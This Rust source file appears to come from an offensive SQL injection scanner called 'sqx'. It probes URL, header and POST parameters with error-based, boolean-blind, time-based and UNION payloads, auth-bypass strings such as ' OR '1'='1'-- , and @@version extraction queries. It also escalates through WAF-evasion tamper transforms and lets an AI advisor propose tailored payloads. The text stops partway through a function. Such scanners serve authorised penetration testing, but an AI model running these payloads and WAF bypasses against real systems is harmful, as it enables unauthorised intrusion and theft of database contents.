//! Core SqliDetector struct: construction, URL/POST scanning, HTTP helpers,
//! and conversion of results to Finding objects.

use anyhow::{anyhow, Result};
use regex::Regex;
use reqwest::Client;
use std::collections::HashSet;
use std::time::{Duration, Instant};
use tracing::{debug, info, warn};

/// Full tamper escalation order tried when WAF blocks a technique.
/// Starts with lightweight transforms, escalates to heavier encoding.
const TAMPER_ESCALATION: &[&str] = &[
    "randomcase",
    "space_to_comment",
    "inline_comment",
    "urlencode",
    "space_to_tab",
    "mysql_version_comment",
    "double_urlencode",
    "hex_encode",
    "space_to_newline",
    "unicode_escape",
    "null_byte",
];

use crate::models::{Finding, Severity, Confidence};
use super::models::{
    HttpResponse, SqliConfig, SqliTechnique, SqliTestResult, SqliInfoExtraction,
};
use super::ai_advisor::{AiAdvisor, TargetContext};
use super::http::build_post_body;
use super::similarity::{calculate_similarity, detect_php_error, detect_sql_error, extract_version_from_error, extract_union_data};
use super::fingerprint::{TargetProber, TargetProfile, ParameterProfile};
use super::evasion::tamper_chain::TamperChain;
use super::session::SessionManager;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};

/// Main SQL injection detector
#[derive(Clone)]
pub struct SqliDetector {
    pub(crate) client: Client,
    pub(crate) config: SqliConfig,
    pub(crate) oob_server: Option<Arc<crate::oob::OobServer>>,
    /// Session manager for authenticated scanning.
    /// Wrapped in Arc for safe concurrent access across tokio tasks.
    pub(crate) session: Option<Arc<SessionManager>>,
    /// Adaptive inter-request delay (ms). Grows when the target returns 429
    /// so that a scan against a rate-limited endpoint self-paces.
    pub(crate) adaptive_delay_ms: Arc<AtomicU64>,
}

impl SqliDetector {
    /// Create a new SQL injection detector
    pub fn new() -> Result<Self> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true)
            .timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

        Ok(Self {
            client,
            config: SqliConfig::default(),
            oob_server: None,
            session: None,
            adaptive_delay_ms: Arc::new(AtomicU64::new(0)),
        })
    }

    /// Create detector with custom config
    pub fn with_config(config: SqliConfig) -> Result<Self> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true)
            .timeout(Duration::from_secs(config.timeout_secs))
            .build()
            .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

        Ok(Self {
            client,
            config,
            oob_server: None,
            session: None,
            adaptive_delay_ms: Arc::new(AtomicU64::new(0)),
        })
    }

    /// Set OOB server for out-of-band detection
    pub fn with_oob_server(mut self, server: Arc<crate::oob::OobServer>) -> Self {
        self.oob_server = Some(server);
        self
    }

    /// Set session manager for authenticated scanning.
    /// All requests will include configured cookies, headers, and CSRF tokens.
    /// Accepts Arc<SessionManager> for safe concurrent access across tokio tasks.
    pub fn with_session(mut self, session: Arc<SessionManager>) -> Self {
        self.session = Some(session);
        self
    }

    /// Test a single URL for SQL injection vulnerabilities
    pub async fn test_url(&self, url: &str) -> Result<Vec<SqliTestResult>> {
        info!("Starting SQL injection scan against: {}", url);
        let mut results = Vec::new();

        let parsed_url = reqwest::Url::parse(url)?;
        let params: Vec<(String, String)> = parsed_url
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        if params.is_empty() {
            warn!("No parameters found in URL: {}", url);
            let common_params = vec!["id", "page", "user", "product", "cat", "category"];
            for param in common_params {
                let test_url = format!("{}?{}=1", url, param);
                if let Ok(param_results) = self.test_parameter(&test_url, param, "1").await {
                    results.extend(param_results);
                }
                tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
            }
        } else {
            for (param, value) in &params {
                if let Ok(param_results) = self.test_parameter(url, param, value).await {
                    results.extend(param_results);
                }
                tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
            }
        }

        // Also probe injectable HTTP headers — many back-ends log X-Forwarded-For,
        // User-Agent, Referer, Cookie directly into DB tables without sanitization.
        let header_results = self.test_headers(url).await;
        results.extend(header_results);

        info!("SQL injection scan complete. Found {} vulnerabilities", results.len());
        Ok(results)
    }

    /// Test POST body parameters for SQL injection.
    ///
    /// `content_type`: `"form"` | `"json"` | `"xml"`
    pub async fn test_url_post(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
    ) -> Result<Vec<SqliTestResult>> {
        info!("Starting POST SQL injection scan against: {} ({})", url, content_type);
        let mut results = Vec::new();

        let params: Vec<(String, String)> = match content_type {
            "json" => {
                match serde_json::from_str::<serde_json::Value>(post_body) {
                    Ok(serde_json::Value::Object(map)) => map
                        .into_iter()
                        .filter_map(|(k, v)| {
                            let val = match &v {
                                serde_json::Value::String(s) => s.clone(),
                                serde_json::Value::Number(n) => n.to_string(),
                                _ => return None,
                            };
                            Some((k, val))
                        })
                        .collect(),
                    _ => {
                        warn!("Failed to parse POST body as JSON");
                        vec![]
                    }
                }
            }
            "xml" => {
                let re = Regex::new(r"<([^/>\s]+)>([^<]*)</[^>]+>")
                    .unwrap_or_else(|_| Regex::new(r"x").unwrap());
                re.captures_iter(post_body)
                    .map(|cap| (cap[1].to_string(), cap[2].to_string()))
                    .collect()
            }
            _ => post_body
                .split('&')
                .filter_map(|pair| {
                    let mut parts = pair.splitn(2, '=');
                    let k = parts.next()?.to_string();
                    let v = parts.next().unwrap_or("").to_string();
                    Some((k, v))
                })
                .collect(),
        };

        if params.is_empty() {
            warn!("No parameters found in POST body");
            return Ok(results);
        }

        let ct_header = match content_type {
            "json" => "application/json",
            "xml"  => "application/xml",
            _      => "application/x-www-form-urlencoded",
        };

        let baseline = self
            .send_post_request(url, post_body.to_string(), ct_header)
            .await?;

        'param_loop: for (param, original_value) in &params {
            // Phase 1: cheap error/time probe with a bare quote and double-quote.
            // Fires fast path for error-based and time-based findings.
            for probe in &["'", "\""] {
                let injected = format!("{}{}", original_value, probe);
                let modified_body = build_post_body(post_body, param, &injected, content_type);
                let resp = match self
                    .send_post_request(url, modified_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                if let Some(error_evidence) = detect_sql_error(&resp.body) {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::ErrorBased,
                        confidence: 0.9,
                        payload: probe.to_string(),
                        evidence: error_evidence,
                        dbms_hint: None,
                    });
                    tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                    continue 'param_loop;
                }

                if resp.duration.as_secs() >= 5 {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::TimeBased,
                        confidence: 0.75,
                        payload: probe.to_string(),
                        evidence: format!("Response delayed: {}ms", resp.duration.as_millis()),
                        dbms_hint: None,
                    });
                    tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                    continue 'param_loop;
                }
            }

            // Phase 2: boolean-blind context probe. Try each quote context with a
            // TRUE/FALSE pair; confirmed context determines the reported bypass.
            let is_numeric = original_value.parse::<i64>().is_ok();
            let contexts: Vec<(&str, String, String, String)> = if is_numeric {
                vec![
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                ]
            } else {
                vec![
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\"-- ", original_value),
                    ),
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                ]
            };

            for (ctx, true_pl, false_pl, bypass) in &contexts {
                let true_body = build_post_body(post_body, param, true_pl, content_type);
                let true_resp = match self
                    .send_post_request(url, true_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;

                let false_body = build_post_body(post_body, param, false_pl, content_type);
                let false_resp = match self
                    .send_post_request(url, false_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                // Only skip on rate-limit or transport errors — a status change
                // between baseline and probe is a SIGNAL, not noise.
                if true_resp.status == 429 || false_resp.status == 429 {
                    debug!(
                        "Skip ctx={} on param={}: rate-limited (true={} false={})",
                        ctx, param, true_resp.status, false_resp.status
                    );
                    continue;
                }

                let true_sim = calculate_similarity(&baseline.body, &true_resp.body);
                let false_sim = calculate_similarity(&baseline.body, &false_resp.body);

                debug!(
                    "Boolean blind ctx={} param={}: true_sim={:.4} false_sim={:.4} gap={:.4}",
                    ctx, param, true_sim, false_sim, true_sim - false_sim,
                );

                // Pattern A: classic data-display boolean-blind.
                // TRUE probe matches baseline, FALSE probe diverges.
                // Use a relative gap instead of an absolute false_sim threshold so we
                // catch targets where TRUE/FALSE pages differ by only a few percent
                // (e.g. a different small image on success vs fail: ~3% body delta).
                let sim_gap = true_sim - false_sim;
                let classic = true_resp.status == baseline.status
                    && false_resp.status == baseline.status
                    && true_sim > 0.9
                    && sim_gap > 0.02;

                // Pattern B: auth-bypass. Probe the actual bypass payload.
                // If response differs strongly from baseline (status change or
                // big body delta), the injection closes the string context.
                let bypass_body_str = build_post_body(post_body, param, bypass, content_type);
                let bypass_resp = match self
                    .send_post_request(url, bypass_body_str, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => {
                        // If bypass probe fails, still fall through on Pattern A.
                        if classic {
                            info!(
                                "Boolean-blind confirmed on param={} context={} (T={:.2}, F={:.2})",
                                param, ctx, true_sim, false_sim
                            );
                            results.push(SqliTestResult {
                                parameter: param.clone(),
                                technique: SqliTechnique::BooleanBlind,
                                confidence: 0.9,
                                payload: bypass.clone(),
                                evidence: format!(
                                    "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                    ctx, true_sim * 100.0, false_sim * 100.0, bypass
                                ),
                                dbms_hint: None,
                            });
                            break;
                        }
                        continue;
                    }
                };

                if bypass_resp.status == 429 {
                    debug!("Bypass probe rate-limited for ctx={} param={}", ctx, param);
                    // Fall through on Pattern A only.
                    if classic {
                        results.push(SqliTestResult {
                            parameter: param.clone(),
                            technique: SqliTechnique::BooleanBlind,
                            confidence: 0.9,
                            payload: bypass.clone(),
                            evidence: format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx, true_sim * 100.0, false_sim * 100.0, bypass
                            ),
                            dbms_hint: None,
                        });
                        break;
                    }
                    continue;
                }

                let bypass_sim = calculate_similarity(&baseline.body, &bypass_resp.body);
                let status_changed =
                    bypass_resp.status != baseline.status && bypass_resp.status < 500;
                let auth_bypass = status_changed || bypass_sim < 0.5;

                if classic || auth_bypass {
                    let (conf, evidence) = if auth_bypass {
                        (
                            0.95,
                            format!(
                                "Context={} auth-bypass confirmed: baseline status={} → bypass status={}, sim={:.0}%. Payload: {}",
                                ctx, baseline.status, bypass_resp.status, bypass_sim * 100.0, bypass
                            ),
                        )
                    } else {
                        (
                            0.9,
                            format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx, true_sim * 100.0, false_sim * 100.0, bypass
                            ),
                        )
                    };
                    info!(
                        "Boolean-blind confirmed on param={} context={} (auth_bypass={})",
                        param, ctx, auth_bypass
                    );
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::BooleanBlind,
                        confidence: conf,
                        payload: bypass.clone(),
                        evidence,
                        dbms_hint: None,
                    });
                    break;
                }
            }

            // Phase 3: UNION-based detection via ORDER BY column count probe.
            // Skipped if we already found a vulnerability for this parameter.
            if results.iter().any(|r| r.parameter == *param) {
                tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                continue;
            }

            if self.config.techniques.contains(&SqliTechnique::UnionBased) {
                // ORDER BY binary search: try ORDER BY 1..20 looking for an error
                // that reveals column count, then confirm with a UNION SELECT probe.
                let mut column_count: Option<usize> = None;
                let mut last_ok = 0usize;

                for i in 1..=20usize {
                    let order_payload = format!("{}' ORDER BY {}-- ", original_value, i);
                    let order_body = build_post_body(post_body, param, &order_payload, content_type);
                    match self.send_post_request(url, order_body, ct_header).await {
                        Ok(r) => {
                            if detect_sql_error(&r.body).is_some() {
                                if last_ok > 0 {
                                    column_count = Some(last_ok);
                                }
                                break;
                            }
                            last_ok = i;
                        }
                        Err(_) => break,
                    }
                    tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                }

                // If ORDER BY didn't reveal count, try UNION SELECT NULL,... fallback.
                if column_count.is_none() && last_ok == 0 {
                    'union_count: for n in (1..=20usize).rev() {
                        let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
                        let union_payload = format!("{}' UNION SELECT {}-- ", original_value, nulls);
                        let union_body = build_post_body(post_body, param, &union_payload, content_type);
                        match self.send_post_request(url, union_body, ct_header).await {
                            Ok(r) => {
                                if detect_sql_error(&r.body).is_none() {
                                    let sim = calculate_similarity(&baseline.body, &r.body);
                                    // Response must differ from baseline to confirm injection took effect.
                                    if sim < 0.95 || r.status != baseline.status {
                                        column_count = Some(n);
                                        break 'union_count;
                                    }
                                }
                            }
                            Err(_) => {}
                        }
                        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                    }
                }

                if let Some(ncols) = column_count {
                    info!("POST UNION: found {} columns on param={}", ncols, param);
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::UnionBased,
                        confidence: 0.88,
                        payload: format!(
                            "{}' UNION SELECT {}-- ",
                            original_value,
                            (1..=ncols).map(|n| n.to_string()).collect::<Vec<_>>().join(",")
                        ),
                        evidence: format!(
                            "POST UNION-based injection: {} columns detected via ORDER BY/UNION SELECT probe.",
                            ncols
                        ),
                        dbms_hint: None,
                    });
                }
            }

            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        info!("POST SQL injection scan complete. Found {} vulnerabilities", results.len());
        Ok(results)
    }

    /// Test a parameter for server-side code injection (PHP eval, create_function, etc.)
    /// Must run before SQLi tests to avoid false positives from PHP error responses.
    pub(crate) async fn test_code_injection(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Option<SqliTestResult> {
        // A single quote breaks out of PHP string context — if we get a PHP error
        // but no SQL error, this is code injection, not SQLi.
        let probe = format!("{}'", original_value);
        let test_url = self.build_test_url(url, param, original_value, &probe);
        let resp = self.send_request(&test_url).await.ok()?;

        if detect_php_error(&resp.body) && detect_sql_error(&resp.body).is_none() {
            info!("PHP code injection detected on param={}", param);
            // Extract the specific PHP error for evidence
            let evidence_snippet = [
                "ParseError", "Parse error:", "Fatal error:",
                "syntax error, unexpected", "create_function", "eval()'d code",
                "runtime-created function",
            ]
            .iter()
            .find(|p| resp.body.contains(*p))
            .copied()
            .unwrap_or("PHP error in response");

            return Some(SqliTestResult {
                parameter: param.to_string(),
                technique: SqliTechnique::CodeInjection,
                confidence: 0.90,
                payload: probe,
                evidence: format!(
                    "PHP code injection — server eval'd user input. Indicator: '{}'. \
                     Not SQL injection. Check for eval(), create_function(), or similar constructs.",
                    evidence_snippet
                ),
                dbms_hint: None,
            });
        }
        None
    }

    /// Test a specific parameter for SQL injection using all configured techniques
    pub(crate) async fn test_parameter(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliTestResult>> {
        debug!("Testing parameter: {} = {}", param, original_value);
        let mut results = Vec::new();

        // Code injection check first — prevents false positive SQLi reports
        // when the server uses PHP eval/create_function on user input.
        if let Some(result) = self.test_code_injection(url, param, original_value).await {
            results.push(result);
            return Ok(results);
        }

        let baseline = self.send_request(url).await?;

        if self.config.techniques.contains(&SqliTechnique::ErrorBased)
            && let Some(result) = self.test_error_based(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::BooleanBlind)
            && let Some(result) = self.test_boolean_blind(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::TimeBased)
            && let Some(result) = self.test_time_based(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::UnionBased)
            && let Some(result) = self.test_union_based(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::StackedQueries)
            && let Some(result) = self.test_stacked_queries(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::OutOfBand)
            && let Some(result) = self.test_out_of_band(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        Ok(results)
    }

    /// Send HTTP GET request and return response details.
    /// If a session manager is configured, its cookies/headers are automatically applied
    /// and session cookies are updated from the response. CSRF tokens are auto-refreshed
    /// if stale (every 30s or on first request).
    pub async fn send_request(&self, url: &str) -> Result<HttpResponse> {
        // Auto-refresh CSRF token if needed before sending request
        if let Some(ref session) = self.session {
            session.maybe_refresh_csrf(&self.client).await;
        }

        let start = Instant::now();
        let mut builder = self
            .client
            .get(url)
            .header("User-Agent", &self.config.user_agent);

        // Apply session if configured
        if let Some(ref session) = self.session {
            builder = session.apply(builder);
        }

        let response = builder.send().await?;

        // Update session cookies from response
        if let Some(ref session) = self.session {
            session.update_from_response(&response);
        }

        let status = response.status().as_u16();
        let headers: std::collections::HashMap<String, String> = response
            .headers()
            .iter()
            .filter_map(|(k, v)| v.to_str().ok().map(|vs| (k.as_str().to_lowercase(), vs.to_string())))
            .collect();
        let body = response.text().await?;
        let duration = start.elapsed();

        Ok(HttpResponse { status, body, duration, headers })
    }

    /// Send a POST request with a raw body. Applies session + User-Agent.
    /// Retries up to 3 times with exponential backoff when the server returns 429.
    pub(crate) async fn send_post_request(
        &self,
        url: &str,
        body: String,
        content_type: &str,
    ) -> Result<HttpResponse> {
        let mut attempt: u32 = 0;
        loop {
            // Self-pace: sleep the current adaptive floor before sending.
            let floor = self.adaptive_delay_ms.load(Ordering::Relaxed);
            if floor > 0 {
                tokio::time::sleep(Duration::from_millis(floor)).await;
            }

            if let Some(ref session) = self.session {
                session.maybe_refresh_csrf(&self.client).await;
            }
            let start = Instant::now();
            let mut builder = self
                .client
                .post(url)
                .header("Content-Type", content_type)
                .header("User-Agent", &self.config.user_agent)
                .body(body.clone());
            if let Some(ref session) = self.session {
                builder = session.apply(builder);
            }
            let resp = builder.send().await?;
            if let Some(ref session) = self.session {
                session.update_from_response(&resp);
            }
            let status = resp.status().as_u16();
            let headers: std::collections::HashMap<String, String> = resp
                .headers()
                .iter()
                .filter_map(|(k, v)| v.to_str().ok().map(|vs| (k.as_str().to_lowercase(), vs.to_string())))
                .collect();
            let body_text = resp.text().await?;

            if status == 429 && attempt < 5 {
                let wait = Duration::from_secs(2u64 << attempt);
                // Grow the self-pacing floor so future requests spread out.
                let new_floor = (self.adaptive_delay_ms.load(Ordering::Relaxed) + 500).min(4000);
                self.adaptive_delay_ms.store(new_floor, Ordering::Relaxed);
                debug!(
                    "429 — backing off {:?}, adaptive floor now {}ms (attempt {})",
                    wait, new_floor, attempt + 1
                );
                tokio::time::sleep(wait).await;
                attempt += 1;
                continue;
            }

            return Ok(HttpResponse {
                status,
                body: body_text,
                duration: start.elapsed(),
                headers,
            });
        }
    }

    /// Build test URL with injected payload replacing the target parameter
    pub(crate) fn build_test_url(
        &self,
        url: &str,
        param: &str,
        _original_value: &str,
        payload: &str,
    ) -> String {
        let mut parsed_url = match reqwest::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return url.to_string(),
        };

        let query_pairs: Vec<(String, String)> = parsed_url
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        parsed_url.set_query(None);

        let mut param_found = false;
        {
            let mut serializer = parsed_url.query_pairs_mut();
            for (key, value) in query_pairs {
                if key == param {
                    serializer.append_pair(&key, payload);
                    param_found = true;
                } else {
                    serializer.append_pair(&key, &value);
                }
            }
            if !param_found {
                serializer.append_pair(param, payload);
            }
        }

        parsed_url.to_string()
    }

    /// Convert SQX results to Finding objects
    pub fn results_to_findings(&self, results: Vec<SqliTestResult>, url: &str) -> Vec<Finding> {
        use chrono::Utc;
        use uuid::Uuid;

        results
            .into_iter()
            .map(|result| Finding {
                id: Uuid::new_v4().to_string(),
                timestamp: Utc::now(),
                tool: "sqx".to_string(),
                severity: match result.technique {
                    SqliTechnique::ErrorBased => Severity::High,
                    SqliTechnique::BooleanBlind => Severity::High,
                    SqliTechnique::TimeBased => Severity::High,
                    SqliTechnique::UnionBased => Severity::Critical,
                    SqliTechnique::StackedQueries => Severity::Critical,
                    SqliTechnique::OutOfBand => Severity::High,
                    SqliTechnique::CodeInjection => Severity::Critical,
                },
                confidence: if result.confidence > 0.9 {
                    Confidence::Certain
                } else {
                    Confidence::Firm
                },
                title: format!("SQL Injection ({})", result.technique),
                description: format!(
                    "Parameter '{}' is vulnerable to {} SQL injection. {}",
                    result.parameter, result.technique, result.evidence
                ),
                url: url.to_string(),
                request_id: None,
                evidence: Some(format!(
                    "Payload: {}\nEvidence: {}",
                    result.payload, result.evidence
                )),
                remediation: Some(
                    "Use parameterized queries/prepared statements. Validate and sanitize all user input."
                        .to_string(),
                ),
                cve_id: None,
                cvss_score: Some(9.8),
                tags: vec![
                    "sql-injection".to_string(),
                    result.technique.to_string().to_lowercase().replace(' ', "-"),
                ],
                raw_output: serde_json::to_string(&result).unwrap_or_default(),
            })
            .collect()
    }

    /// Extract basic info via SQL injection (if vulnerability confirmed)
    pub async fn extract_info(
        &self,
        url: &str,
        param: &str,
        technique: &SqliTechnique,
    ) -> Result<SqliInfoExtraction> {
        let mut info = SqliInfoExtraction::default();

        match technique {
            SqliTechnique::ErrorBased => {
                let version_payloads = [
                    "' AND 1=CONVERT(int, @@version)-- ",
                    "' AND 1=CAST(@@version AS int)-- ",
                    "' AND 1=1/@@version-- ",
                ];
                for payload in &version_payloads {
                    let test_url = self.build_test_url(url, param, "1", payload);
                    if let Ok(response) = self.send_request(&test_url).await
                        && let Some(version) = extract_version_from_error(&response.body) {
                            info.version = Some(version);
                            break;
                        }
                }
            }
            SqliTechnique::UnionBased => {
                let union_payload = "-1' UNION SELECT 1,@@version,3,4,5,6,7,8,9,10-- ";
                let test_url = self.build_test_url(url, param, "1", union_payload);
                if let Ok(response) = self.send_request(&test_url).await {
                    info.version = extract_union_data(&response.body, 2);
                    info.user = extract_union_data(&response.body, 1);
                }
            }
            _ => {}
        }

        Ok(info)
    }

    /// Scan with behavioral fingerprinting (recommended entry point).
    /// Phase 1: Fingerprint the target (~10-15 benign probes).
    /// Phase 2: Run injection tests using the strategy derived from the profile.
    pub async fn scan_smart(&self, url: &str) -> Result<(TargetProfile, Vec<SqliTestResult>)> {
        // Phase 1: Fingerprint
        let prober = TargetProber::new(
            self.client.clone(),
            Duration::from_secs(self.config.timeout_secs),
            self.config.user_agent.clone(),
        );
        let profile = prober.profile(url).await?;

        info!(
            "Target profile: WAF={:?}, DBMS={:?}, strategy={:?}",
            profile.waf.as_ref().map(|w| &w.name),
            profile.dbms_hint,
            profile.strategy.technique_order
        );

        // Phase 2: Scan using strategy
        let results = self.scan_with_strategy(url, &profile).await?;

        Ok((profile, results))
    }

    /// Detect if a response looks like a WAF block rather than a normal "not vulnerable" response.
    fn is_waf_blocked(resp: &HttpResponse, waf_block_status: Option<u16>) -> bool {
        // Match known block status codes
        if matches!(resp.status, 403 | 406 | 429 | 503) {
            return true;
        }
        // Match the fingerprinted WAF's specific block status
        if let Some(expected) = waf_block_status {
            if expected != 0 && resp.status == expected {
                return true;
            }
        }
        // Detect WAF block signatures in body
        let body_lower = resp.body.to_lowercase();
        let waf_signatures = [
            "access denied", "blocked", "forbidden", "not acceptable",
            "security violation", "attack detected", "cloudflare",
            "request rejected", "waf", "web application firewall",
            "incapsula", "imperva", "akamai", "sucuri",
        ];
        waf_signatures.iter().any(|s| body_lower.contains(s))
    }

    /// Send a minimal probe payload and check if WAF is blocking this parameter.
    async fn probe_is_blocked(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        tamper: Option<&TamperChain>,
        waf_block_status: Option<u16>,
    ) -> bool {
        let raw = format!("{}'", original_value);
        let payload = match tamper {
            Some(chain) => chain.apply(&raw),
            None => raw,
        };
        let test_url = self.build_test_url(url, param, original_value, &payload);
        match self.send_request(&test_url).await {
            Ok(resp) => Self::is_waf_blocked(&resp, waf_block_status),
            Err(_) => false,
        }
    }

    /// Scan using a pre-built strategy from fingerprinting.
    async fn scan_with_strategy(&self, url: &str, profile: &TargetProfile) -> Result<Vec<SqliTestResult>> {
        let mut results = Vec::new();

        // Only test parameters that are likely DB-backed
        let target_params: Vec<&ParameterProfile> = profile.parameters.iter()
            .filter(|p| p.likely_db_param || p.influences_output)
            .collect();

        // If no params seem promising, test all (fallback)
        let params_to_test: Vec<&ParameterProfile> = if target_params.is_empty() {
            profile.parameters.iter().collect()
        } else {
            target_params
        };

        // Build tamper chain if WAF detected
        let tamper = if !profile.strategy.tamper_chain.is_empty() {
            let names: Vec<&str> = profile.strategy.tamper_chain.iter().map(|s| s.as_str()).collect();
            Some(TamperChain::from_names(&names))
        } else {
            None
        };
        let tamper_ref = tamper.as_ref();

        let advisor = AiAdvisor::new(self.config.ai_advisor.clone());
        let waf_block_status = profile.waf.as_ref().map(|w| w.block_status);

        // Build the full tamper escalation list for this target:
        // WAF-recommended tampers first, then generic escalation order.
        let waf_tampers: Vec<String> = profile.waf.as_ref()
            .map(|w| w.recommended_tampers.clone())
            .unwrap_or_default();
        let escalation_list: Vec<String> = {
            let mut seen = HashSet::new();
            let mut list = Vec::new();
            // WAF-specific first
            for t in &waf_tampers {
                if seen.insert(t.clone()) { list.push(t.clone()); }
            }
            // Generic escalation after
            for t in TAMPER_ESCALATION {
                let s = t.to_string();
                if seen.insert(s.clone()) { list.push(s); }
            }
            list
        };

        for param in &params_to_test {
            // Track which tamper names we've tried for this param to avoid repeating
            let mut tried_tampers: HashSet<String> = profile.strategy.tamper_chain
                .iter().cloned().collect();

            // Test techniques in strategy-recommended order
            'technique: for technique_name in &profile.strategy.technique_order {
                let technique = match technique_name.as_str() {
                    "ErrorBased"    => SqliTechnique::ErrorBased,
                    "BooleanBlind"  => SqliTechnique::BooleanBlind,
                    "TimeBased"     => SqliTechnique::TimeBased,
                    "UnionBased"    => SqliTechnique::UnionBased,
                    "StackedQueries"=> SqliTechnique::StackedQueries,
                    "OutOfBand"     => SqliTechnique::OutOfBand,
                    _ => continue,
                };

                // ── AI advisor: try personalized payloads first ────────────────
                if self.config.ai_advisor.enabled && technique != SqliTechnique::OutOfBand {
                    let ctx = TargetContext {
                        parameter: param.name.clone(),
                        param_type: if param.is_numeric { "numeric".to_string() } else { "string".to_string() },
                        dbms_hint: profile.dbms_hint.clone(),
                        waf_name: profile.waf.as_ref().map(|w| w.name.clone()),
                        error_snippet: None,
                        reflects_errors: profile.behavior.reflects_errors,
                        reflects_input: profile.behavior.reflects_input,
                        technique: technique_name.to_lowercase()
                            .replace("based", "").replace("blind", "").trim().to_string(),
                    };
                    let suggestions = advisor.suggest(&ctx).await;
                    if !suggestions.is_empty() {
                        let baseline = self.send_request(url).await.ok();
                        if let Some(r) = self.test_ai_payloads(
                            url, &param.name, &param.original_value,
                            &suggestions, technique, baseline.as_ref(), tamper_ref,
                        ).await {
                            results.push(r);
                            continue 'technique;
                        }
                    }
                }

                // ── Static payloads with current tamper ────────────────────────
                let result = self.run_technique(url, param, technique, tamper_ref).await;
                if let Some(r) = result {
                    results.push(r);
                    continue 'technique;
                }

                // ── Adaptive tamper escalation (WAF bypass) ────────────────────
                // Only escalate if a WAF is present and the target didn't just return
                // "no vuln" — we verify blocking with a quick probe first.
                if profile.waf.is_some() {
                    let blocked = self.probe_is_blocked(
                        url, &param.name, &param.original_value,
                        tamper_ref, waf_block_status,
                    ).await;

                    if blocked {
                        debug!(
                            "WAF blocking param={} technique={} — starting tamper escalation",
                            param.name, technique_name
                        );
                        for tamper_name in &escalation_list {
                            if tried_tampers.contains(tamper_name) { continue; }
                            tried_tampers.insert(tamper_name.clone());

                            let escalated = TamperChain::from_names(&[tamper_name.as_str()]);
                            let esc_ref = &escalated;

                            let esc_result = self.run_technique(
                                url, param, technique, Some(esc_ref)
                            ).await;

                            if let Some(mut r) = esc_result {
                                // Tag evidence so analysts know which tamper broke through
                                r.evidence = format!("[tamper:{}] {}", tamper_name, r.evidence);
                                results.push(r);
                                // Update default tamper for remaining techniques on this param
                                continue 'technique;
                            }

                            // Check if this tamper also got blocked; if not, WAF is
                            // no longer the issue — stop escalating
                            let still_blocked = self.probe_is_blocked(
                                url, &param.name, &param.original_value,
                                Some(esc_ref), waf_block_status,
                            ).await;
                            if !still_blocked {
                                debug!("Tamper '{}' bypassed WAF but no vuln found — stopping escalation", tamper_name);
                                break;
                            }
                        }
                    }
                }
            }
        }

        Ok(results)
    }

    /// Dispatch a single technique test — used by both the main loop and escalation.
    async fn run_technique(
        &self,
        url: &str,
        param: &super::fingerprint::ParameterProfile,
        technique: SqliTechnique,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        match technique {
